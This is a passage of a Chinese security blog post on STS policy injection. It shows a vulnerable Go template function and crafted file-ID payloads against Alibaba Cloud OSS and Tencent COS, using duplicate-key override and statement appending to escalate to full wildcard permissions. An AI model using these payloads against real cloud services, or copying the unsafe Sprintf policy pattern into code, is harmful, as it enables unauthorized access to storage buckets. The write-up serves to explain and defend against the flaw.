+</span></span><span class=line><span class=cl>            <span class=p>],</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;acs:oss:*:*:%s/%s&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我们只需要构造payload如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>bucket</span> <span class=p>=</span> <span class=nx>BUCKET</span>
+</span></span><span class=line><span class=cl><span class=nx>fid</span> <span class=p>=</span> <span class=nx>x</span><span class=s>&#34;],&#34;</span><span class=nx>Action</span><span class=s>&#34;:[&#34;</span><span class=nx>oss</span><span class=p>:</span><span class=nx>ListObjects</span><span class=s>&#34;],&#34;</span><span class=nx>Resource</span><span class=s>&#34;:[&#34;</span><span class=nx>acs</span><span class=p>:</span><span class=nx>oss</span><span class=p>:</span><span class=o>*</span><span class=p>:</span><span class=o>*</span><span class=p>:</span><span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><p>传入时Payload 会被放进原始 Policy 模板中第二个 %s 对应的位置</p><p>最终得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Version&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Statement&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;oss:GetObject&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;oss:PutObject&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;acs:oss:*:*:存储桶的名字/x&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;oss:ListObjects&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;acs:oss:*:*:存储桶的名字&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>]</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我们依旧需要先理解几个基本概念。前面已经提到，Action 代表允许执行的操作，Resource 代表这些操作可以作用的资源。原本的代码只给 Policy 配置了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=s>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s>&#34;oss:GetObject&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s>&#34;oss:PutObject&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们注入后有列桶的权限，这里出现了<strong>重复键</strong> <code>Action</code>。绝大多数 JSON 解析器对重复键采用"后者覆盖"，于是这条 Statement 的 <code>Action</code> 最终是 <code>["*",""]</code>，<code>Resource</code> 是 <code>[bucket/*, *]</code>——一条 Statement、Statement 数还是 1，但权限已经被放大到"任意动作、任意资源"（受角色上限约束）。</p><h3 id=其他云的policy注入>其他云的policy注入</h3><p>上面已阿里云为例，下面腾讯云也是类似</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>tencentVulnerablePolicy</span><span class=p>(</span><span class=nx>region</span><span class=p>,</span> <span class=nx>appID</span><span class=p>,</span> <span class=nx>bucket</span><span class=p>,</span> <span class=nx>fid</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s>`{&#34;version&#34;:&#34;2.0&#34;,&#34;statement&#34;:[{&#34;effect&#34;:&#34;allow&#34;,&#34;action&#34;:[&#34;cos:GetObject&#34;,&#34;cos:PutObject&#34;],&#34;resource&#34;:[&#34;qcs::cos:%s:uid/%s:%s/%s&#34;]}]}`</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nx>region</span><span class=p>,</span> <span class=nx>appID</span><span class=p>,</span> <span class=nx>bucket</span><span class=p>,</span> <span class=nx>fid</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>只需要构造</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>uploads</span><span class=o>/</span><span class=nx>alice</span><span class=o>/</span><span class=nx>x</span><span class=p>.</span><span class=nx>txt</span><span class=s>&#34;]},{&#34;</span><span class=nx>effect</span><span class=s>&#34;:&#34;</span><span class=nx>allow</span><span class=s>&#34;,&#34;</span><span class=nx>action</span><span class=s>&#34;:[&#34;</span><span class=o>*</span><span class=s>&#34;],&#34;</span><span class=nx>resource</span><span class=s>&#34;:[&#34;</span><span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><p>注入后变成</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;2.0&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;statement&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;effect&#34;</span><span class=p>:</span> <span class=s2>&#34;allow&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;cos:GetObject&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;cos:PutObject&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>],</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;resource&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;qcs::cos:ap-guangzhou:uid/1320513951:BUCKET/uploads/alice/x.txt&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=p>},</span> 
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;effect&#34;</span><span class=p>:</span> <span class=s2>&#34;allow&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;*&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>],</span> 
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;resource&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;*&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里需要注意：腾讯云会拒绝重复键，因此，腾讯云的做法不是在同一条 Statement 中重复写一个 <code>action</code>，然后等待后者覆盖前者，而是先把原来的 Statement 关闭，再追加一条全新的 Statement。statement 本身就是一个数组，数组里的每个对象就是一条独立的授权语句，所以第二个 { &ldquo;effect&rdquo;: &ldquo;allow&rdquo; &mldr; } 直接作为 statement 数组的第二个元素即可。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/sts-policy%E6%B3%A8%E5%85%A5/>STS Policy注入</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under 9u_l3</span></section></footer></article><script src=//unpkg.com/@waline/client@v2/dist/waline.js></script><link href=//unpkg.com/@waline/client@v2/dist/waline.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://unpkg.com/@waline/emojis@1.0.1/weibo"],locale:{admin:"Admin",placeholder:null},requiredMeta:["name","email","url"],serverURL:"https://waline-test-one-smoky.vercel.app"})</script><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 无敌可爱美咕噜</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c1359695076787b3e6c2c57e9020904701cc696d5767c0ab1e455ca7031aae69.js defer></script><script type=text/javascript src=/ts/custom.21fb9193a315382e5c9cc70d4be76a78390116b15319b875de205795ecf99ac9.js defer></script><script>const cdnPath="https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd",cssPath="https://0d000721999.github.io/waifu/waifu.css",config={path:{homePath:"/",modelPath:cdnPath+"/Resources/",cssPath,tipsJsonPath:cdnPath+"/waifu-tips.json",tipsJsPath:cdnPath+"/waifu-tips.js",live2dCorePath:cdnPath+"/Core/live2dcubismcore.js",live2dSdkPath:cdnPath+"/live2d-sdk.js"},tools:["hitokoto","asteroids","express","photo","quit"],drag:{enable:!0,direction:["x","y"]},switchType:"order"};screen.width>=768&&Promise.all([loadExternalResource(config.path.cssPath,"css"),loadExternalResource(config.path.live2dCorePath,"js"),loadExternalResource(config.path.live2dSdkPath,"js"),loadExternalResource(config.path.tipsJsPath,"js")]).then(()=>{initWidget({waifuPath:config.path.tipsJsonPath,cdnPath:config.path.modelPath,tools:config.tools,dragEnable:config.drag.enable,dragDirection:config.drag.direction,switchType:config.switchType})});function loadExternalResource(e,t){return new Promise((n,s)=>{let o;t==="css"?(o=document.createElement("link"),o.rel="stylesheet",o.href=e):t==="js"&&(o=document.createElement("script"),o.src=e),o&&(o.onload=()=>n(e),o.onerror=()=>s(e),document.head.appendChild(o))})}</script></body></html>
